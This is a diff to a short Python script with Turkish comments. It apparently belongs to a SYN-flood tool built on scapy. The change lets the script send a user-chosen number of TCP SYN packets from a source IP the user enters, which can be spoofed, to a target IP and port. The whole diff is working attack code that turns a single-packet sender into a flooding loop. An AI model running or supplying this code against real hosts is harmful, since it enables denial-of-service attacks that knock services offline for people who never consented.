@@ -96,22 +96,27 @@ def generate_random_ip():
     return '.'.join(ip)
 
 # syn paketi yollayan fonksiyon
-def send_syn_packet(source_ip, target_ip, target_port):
+def send_syn_packet(source_ip, target_ip, target_port, packet_count):
     # scapy kütüphanesinin bu özelliği sayesinde çıktıları ekranda görebiliyoruz bunun default değeri 2'dir.
     # fakat biz syn paketlerinin çıktısını görmek istemediğimiz için bunu 0'a çekiyoruz
     # long story short ekrana detay yazdırmak istiyorsak 2 yani default değer eğer ekrana detay yazdırmak istemiyorsak 0 yazıyoruz 
     conf.verb = 0
-    # paketi hangi ip'den hangi ip'ye, hangi port numarası üzerinden hangi bit'i yollayacağımızı ayarladığımız kod
-    packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
-    send(packet)
+    
+    for _ in range(packet_count):
+        # paketi hangi ip'den hangi ip'ye, hangi port numarası üzerinden hangi bit'i yollayacağımızı ayarladığımız kod
+        packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
+        send(packet)
+
+    print(f"SYN paketi {target_ip}:{target_port} adresine gönderildi.")
+
 
 # syn paketini yolladığında ekrana yazdıran fonksiyon
 def send_syn_and_print():
     source_ip = input("Kaynak IP adresini girin: ")
     target_ip = input("Hedef IP adresini girin: ")
     target_port = int(input("Hedef port numarasını girin: "))
-    send_syn_packet(source_ip, target_ip, target_port)
-    print(f"SYN paketi {target_ip}:{target_port} adresine gönderildi.")
+    packet_count = int(input("Yollamak istediğiniz SYN paketlerinin sayısını giriniz: "))
+    send_syn_packet(source_ip, target_ip, target_port, packet_count)
 
 
 
